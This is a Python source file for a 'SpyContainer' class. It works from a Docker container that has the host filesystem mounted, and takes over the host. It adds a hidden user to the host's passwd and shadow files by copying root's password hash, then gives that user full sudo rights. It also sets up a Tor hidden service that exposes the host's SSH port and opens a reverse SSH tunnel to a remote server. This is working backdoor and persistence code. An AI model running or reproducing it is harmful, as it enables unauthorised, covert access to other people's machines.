import logging
import os
import random
import string
import time
from typing import Optional

from docker.models.containers import Container

logger = logging.getLogger()


class SpyContainer:

    def __init__(self, spy_container: Container, hole_directory_path: str) -> None:
        self._spy_container = spy_container
        self._hole_directory_path = hole_directory_path
        self.put_warning_file()

    def put_warning_file(self) -> None:
        warning_surena_path = os.path.join(os.path.dirname(__file__), "WARNING.surena")
        with open(warning_surena_path, "r") as file:
            content = file.read()
        self.execute_command(f'echo "{content}" > {self._hole_directory_path}/root/WARNING.surena')

    def get_docker_host_ssh_port(self) -> int:
        sshd_port_command = (
            f"cat /{self._hole_directory_path}/etc/ssh/sshd_config | sed -e 's/^[[:space:]]*//' | grep -E '^Port'"
        )
        sshd_port = self.execute_command(sshd_port_command)

        if sshd_port is None:
            return 22

        splited = sshd_port.strip().split()
        if splited == [] or len(splited) != 2:
            return 22
        else:
            if splited[1].isnumeric():
                return int(splited[1])
            else:
                return 22

    @staticmethod
    def generate_random_word(word_length: int) -> str:
        return "".join(random.choice(string.ascii_lowercase) for _ in range(word_length))

    def generate_docker_host_unique_username(self, username_length: int) -> str:
        usernames_command = f'cat /{self._hole_directory_path}/etc/passwd | cut -d ":" -f 1'
        usernames = self.execute_command(usernames_command)

        assert usernames is not None

        while True:
            username = SpyContainer.generate_random_word(username_length)
            if username not in usernames:
                break

        return username

    def add_username_to_docker_host(self, username: str, password: str) -> None:
        chpasswd_command = f"echo 'root:{password}' | chpasswd"
        passwd_command = f"echo '{username}:x:10222:10222:test:/:/bin/sh' >> /{self._hole_directory_path}/etc/passwd"
        shadow_command = (
            "cat /etc/shadow | grep root | head -1 | "
            f"sed 's/root/{username}/' >> /{self._hole_directory_path}/etc/shadow"
        )

        self.execute_command(chpasswd_command)
        self.execute_command(passwd_command)
        self.execute_command(shadow_command)

    def add_username_to_sudoer_group(self, username: str) -> None:
        sudoers_directory_command = f"mkdir -p /{self._hole_directory_path}/etc/sudoers.d"
        sudoers_file_content = f"{username} ALL=(ALL:ALL) ALL"
        sudoers_file_command = f"echo '{sudoers_file_content}' > /{self._hole_directory_path}/etc/sudoers.d/{username}"

        self.execute_command(sudoers_directory_command)
        self.execute_command(sudoers_file_command)

    def delelte_username_from_sudoer_group(self, username: str) -> None:
        command = f"rm /{self._hole_directory_path}/etc/sudoers.d/{username}"

        self.execute_command(command)

    def get_free_port_on_docker_host(self) -> int:
        command = "ss -tlpn | awk '{print $4}' |rev |cut -d \":\" -f-1 | rev"

        while True:
            open_ports = self.execute_command(command)
            free_port = random.randint(35000, 60000)

            assert open_ports is not None

            if str(free_port) not in open_ports:
                return free_port

    def config_service_tor(
        self, docker_host_ssh_port: int, ssh_tor_port_on_docker_host: int, tor_port_on_docker_host: int
    ) -> None:
        torrc_file = "/etc/tor/torrc"

        socks_port_command = f"sed -i 's/#SocksPort 9050/SocksPort {tor_port_on_docker_host}/g' {torrc_file}"
        ssh_port_command = (
            "sed -i '0,/#HiddenServicePort 80 "
            f"127.0.0.1:80/s//HiddenServicePort {ssh_tor_port_on_docker_host} "
            f"0.0.0.0:{docker_host_ssh_port}/' {torrc_file}"
        )
        hidden_service_command = rf"sed -i '/#HiddenServiceDir \/var\/lib\/tor\/hidden_service\//s/^#//g' {torrc_file}"
        chown_command = "chown root:root /var/lib/tor"

        commands = [
            socks_port_command,
            ssh_port_command,
            hidden_service_command,
            chown_command,
        ]

        for command in commands:
            self.execute_command(command)

    def run_tor_service(self) -> None:
        self.execute_command("echo 'tor -f /etc/tor/torrc &' > tor.sh")
        self.execute_command("chmod +x tor.sh")
        self.execute_command("nohup ./tor.sh")

    def get_tor_hostname(self) -> str:
        return str(self.execute_command("cat /var/lib/tor/hidden_service/hostname"))

    def wait_until_connect_to_tor_network(self) -> None:
        while True:
            tor_log = self.execute_command("cat /nohup.out")
            logger.info("Spy container cannot connect to Tor Network yet.")
            assert tor_log is not None
            if "100% (done): Done" in tor_log:
                logger.info("Spy container has connected to the Tor Network.")
                break
            time.sleep(5)

    def reverse_ssh_from_docker_host_to_remote_server(
        self,
        ssh_server_address: str,
        ssh_server_port: int,
        ssh_server_username: str,
        ssh_server_password: str,
        free_port_on_ssh_server: int,
        ssh_port_on_docker_host: int,
    ) -> None:
        ssh_command = (
            f"sshpass -p {ssh_server_password} ssh -o 'StrictHostKeyChecking=no' "
            f"-R *:{free_port_on_ssh_server}:localhost:{ssh_port_on_docker_host} -f -N "
            f"-p {ssh_server_port} {ssh_server_username}@{ssh_server_address}"
        )
        self.execute_command(ssh_command)

    def delete_username_from_docker_host(
        self,
        username: str,
    ) -> None:
        delete_from_passwd_commad = f"sed -i '/^{username}:.*/d' /{self._hole_directory_path}/etc/passwd"
        delete_from_shadow_command = f"sed -i '/^{username}:.*/d' /{self._hole_directory_path}/etc/shadow"

        self.execute_command(delete_from_passwd_commad)
        self.execute_command(delete_from_shadow_command)

    def execute_command(self, *command: str) -> Optional[str]:
        output = self._spy_container.exec_run(cmd=["sh", "-c"] + list(command), tty=True, demux=True)[1][0]

        return output.decode("utf-8") if output else None

    @property
    def container(self) -> Container:
        return self._spy_container
